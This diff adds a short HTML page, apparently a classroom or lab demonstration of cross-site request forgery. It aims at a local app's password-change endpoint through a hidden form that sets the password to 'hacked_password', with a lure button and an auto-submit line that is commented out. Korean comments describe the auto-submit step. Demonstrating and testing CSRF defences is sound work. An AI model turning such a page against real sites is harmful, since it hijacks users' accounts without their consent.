@@ -1,0 +1,22 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>Malicious Page</h1>
+    <p>If you're seeing this, your password will be changed without your consent.</p>
+
+    <!-- 비밀번호 변경 폼을 자동으로 제출 -->
+    <form action="http://localhost:5000/change_password" method="post" id="csrfForm">
+        <input type="hidden" name="new_password" value="hacked_password">
+        <input type="submit" value="Click here to update your profile!">
+    </form>
+
+    <script>
+        // 폼을 자동으로 제출하여 비밀번호 변경 시도
+        // document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
